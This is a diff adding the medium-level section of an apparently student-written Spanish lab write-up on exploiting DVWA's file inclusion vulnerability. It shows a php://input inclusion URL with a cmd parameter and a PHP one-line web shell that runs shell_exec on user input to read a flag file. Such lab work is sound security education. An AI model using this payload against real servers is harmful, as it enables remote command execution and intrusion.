@@ -44,6 +44,24 @@ http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=cat%20/var/www/ht
 
 ## Medio
 
+Realizando la misma prueba que en el nivel bajo con la URI que conseguia mostrar el contenido del archivo `fi.php`.
+
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=cat%20/var/www/html/DVWA/hackable/flags/fi.php
+```    
+
+Al igual que antes, añadimos la siguiente linea código al final de la petición, de tal manera que ejecute el comando `cat` para leer el archivo `fi.php` y lo muestre en la página.
+
+```php
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+![lfi-m](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/lfi-m.png)
+
+Una vez modificada la petición, pulsamos `Forward` para enviarla al servidor y obtener el contenido del archivo `fi.php`.
+
+![challenge-2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/challenge-2.png)
+
 ## Alto
 
 ## Imposible
